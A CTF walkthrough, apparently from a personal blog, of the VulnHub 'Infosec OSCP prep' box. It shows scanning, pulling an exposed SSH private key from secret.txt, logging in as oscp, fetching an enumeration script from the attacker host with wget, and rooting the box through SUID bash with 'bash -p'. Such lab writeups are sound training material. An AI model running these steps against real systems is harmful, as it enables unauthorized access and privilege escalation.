---
title: "Infosec OSCP prep"
date: 2024-06-12
draft: false
summary: "Writeup for Infosec OSCP prep CTF challenge on VulnHub."
tags: ["linux", "suid", "wordpress"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/infosec_oscp_prep/cover.png"
  caption: "Infosec OSCP prep VulnHub Challenge"
  alt: "Infosec OSCP prep cover"
platform: "VulnHub"
---

*Infosec OSCP prep* is a boot to root box that contains 1 flag in the */root/* directory.
<!--more-->
You can download  *Infosec OSCP prep* from **VulnHub** by clicking on the link given below: 
- https://www.vulnhub.com/entry/infosec-prep-oscp,508/

## Recon

After booting the machine on **VMware**, I performed a network scan using **netdiscover** to discover the target IP.

```bash
netdiscover -r 192.168.1.0/24  
```

After finding the target IP, I performed an **nmap** aggressive scan to identify open ports and services.

```
nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
```

| **Port** | **Service** |
| -------- | ----------- |
| 22       | ssh         |
| 80       | http        |
| 33060    | mysql       |

![](https://cdn.ziomsec.com/infosec_oscp_prep/1.png)

## Initial Foothold

I visited the web application that was running on the target using my browser.

![](https://cdn.ziomsec.com/infosec_oscp_prep/2.png)

![](https://cdn.ziomsec.com/infosec_oscp_prep/3.png)

The home page disclosed 2 things:
- Username: *oscp*.
- CMS: *WordPress*.

Upon closer inspection, when I clicked on the *SAMPLE PAGE* button on the top right corner, I got redirected to another page. I scrolled down and found a link to go to a login page.

![](https://cdn.ziomsec.com/infosec_oscp_prep/4.png)

Upon clicking the *Log in* button, I got redirected to a wordpress login panel.

![](https://cdn.ziomsec.com/infosec_oscp_prep/5.png)

To find more hidden directories and files, I ran a scan using **dirb**.

```shell
dirb http://TARGET/ /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
```

![](https://cdn.ziomsec.com/infosec_oscp_prep/6.png)

![](https://cdn.ziomsec.com/infosec_oscp_prep/7.png)

I visited the *robots.txt* page and found a link to a file called *secret.txt*

![](https://cdn.ziomsec.com/infosec_oscp_prep/8.png)

Upon visiting *secret.txt*, I get a base64 encoded block of text.

![](https://cdn.ziomsec.com/infosec_oscp_prep/9.png)

I decoded this file and downloaded it onto my system.

```shell
curl http://TARGET/secret.txt | base64 -d > secret.txt
```

![](https://cdn.ziomsec.com/infosec_oscp_prep/10.png)

It turned out to be a private key. In order to **ssh** into the target using it, I had to find a valid username. Since the site was running on WordPress, I ran a scan using **wpscan** but didn't find anything besides the version and theme.

```bash
wpscan --url http://192.168.1.7
```

![](https://cdn.ziomsec.com/infosec_oscp_prep/11.png)

![](https://cdn.ziomsec.com/infosec_oscp_prep/12.png)

I had earlier identified a username called *oscp* so, I tried using it along with the private key. To use the key for authentication, I modified its permissions so that only the owner has read and write access.

```shell
mv secret.txt private.key
chmod 600 private.key
```

![](https://cdn.ziomsec.com/infosec_oscp_prep/13.png)

I then authenticated to the box using the key:

```shell
ssh -i private.key oscp@TARGET
```

![](https://cdn.ziomsec.com/infosec_oscp_prep/14.png)

I got initial access to the system.

## Privilege Escalation

The challenge description mentioned that the flag was present inside the */root* directory. So, I tried downloaded **linux smart enumeration** script from **github** to enumerate privilege escalation vectors.

- https://github.com/diego-treitos/linux-smart-enumeration

```shell
cd /tmp
which wget
wget "http://KALI/lse.sh"
chmod +x lse.sh
```

![](https://cdn.ziomsec.com/infosec_oscp_prep/15.png)

It detected an **SUID** bit on the **bash** binary.

![](https://cdn.ziomsec.com/infosec_oscp_prep/16.png)

I manually verified this by using the following command:

```bash
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/infosec_oscp_prep/17.png)

Now I can simply type **bash -p** to get root access.

The **bash -p** command starts a new instance of the Bash shell in "privileged" mode. In simple terms, it means:
- **bash** is the command to start a new Bash shell.
- **-p** stands for "privileged mode."

With root access, I captured the flag from the *root* directory.

![](https://cdn.ziomsec.com/infosec_oscp_prep/18.png)

## Closure

Here's a short summary of how I pwned the system:
- I found a username from the webpage: *oscp*.
- I found an SSH private key from the *robots.txt* listing inside *secret.txt*.
- I logged in as *oscp* using this SSH private key.
- I found an SUID bit on */bin/bash*.
- I executed privileged mode on **bash** using **bash -p**.

That's it from my side. Happy Hacking :)

------------------------------------------------------------------------------------